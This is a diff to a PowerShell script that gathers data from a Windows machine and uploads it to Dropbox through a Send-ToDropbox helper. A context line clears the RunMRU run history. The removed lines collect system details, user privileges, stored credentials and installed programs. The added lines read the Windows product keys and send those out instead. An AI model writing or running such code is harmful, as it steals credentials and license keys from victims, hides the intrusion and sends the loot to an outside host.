@@ -41,9 +41,7 @@ function Send-ToDropbox {
 
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
 
-$Report = "*** System Information ***`n $(SYSTEMINFO | Out-String)`n"
-$Report += "*** User Information ***`n $(WHOAMI /ALL | Out-String)`n"
-$Report += "*** Stored Credentials ***`n $(CMDKEY /LIST | Out-String)`n"
-$Report += "*** Installed Programs ***`n $(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)"
+$ProductKey = "Original Product Key: $((Get-WmiObject -Query 'select * from SoftwareLicensingService').OA3xOriginalProductKey | Out-String)`n"
+$ProductKey += "Backup Product Key: $((Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform').BackupProductKeyDefault | Out-String)"
 
-Send-ToDropbox -Content $Report -RefreshToken $REFRESH_TOKEN -AppKey $APP_KEY -AppSecret $APP_SECRET
+Send-ToDropbox -Content $ProductKey -RefreshToken $REFRESH_TOKEN -AppKey $APP_KEY -AppSecret $APP_SECRET
